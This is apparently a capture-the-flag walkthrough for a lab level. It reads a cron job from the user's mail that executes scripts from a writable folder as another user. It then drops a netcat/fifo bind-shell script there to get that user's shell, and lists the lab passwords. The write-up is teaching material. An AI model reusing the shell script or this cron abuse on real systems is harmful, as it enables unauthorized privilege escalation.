# LEVEL 05

> [!TIP]
> user: `level05` <br>
> pass: `ne2searoevaevoem4ov4ar8ap`

## STEP 01

As we log in, a message appear to us

`You have new mail.`

According to this [link](https://superuser.com/a/306180), email can be found at
**/var/mail/$USER**

## STEP 02

Executing `cat /var/mail/$USER` output a cron job, running every 2 minutes
and pointing in to `/usr/sbin/openarenaserver`

```bash
cat /var/mail/level05
#*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
cat /usr/sbin/openarenaserver
##!/bin/sh
#
#for i in /opt/openarenaserver/* ; do
#        (ulimit -t 5; bash -x "$i")
#        rm -f "$i"
#done
```

Making a quick ls show us the permission of the folder mentioned in the script
above

```bash
ls -la /opt/openarenaserver
#drwxrwxr-x+ 2 root root 40 Dec  2 02:10 .
```

> [!NOTE]
> The security issue could be perhaps, this ugly for loop with this blob that
> execute everything in the folder `/opt/openarenaserver`, with a limit of 5 fd,
> that is writable to other user

## STEP 03

1. creating a little script

```bash
#!/bin/bash

# remove previous fifo
rm -f /tmp/f
# make fifo file
mkfifo /tmp/f
# 1. output any input, from fifo, to
# 2. bash, outputing STDOUT and STDERR to
# 3. nc listening on everything, on port 4444, output all ouput to fifo
cat /tmp/f | /bin/bash -i 2>&1 | nc -l 0.0.0.0 4444 > /tmp/f
```

2. put it in **/opt/openarenaserver**, and wait
for it to be deleted

> [!WARNING]
> Don't forget to make it executable by `chmod +x` it

3. quickly do a `nc localhost 4444` to have a shell

> [!TIP]
> you can do a `watch -n2 ls -la /opt/openarenaserver` to monitor the folder

> [!IMPORTANT]
> the password for the next level is `viuaaale9huek52boumoomioc`
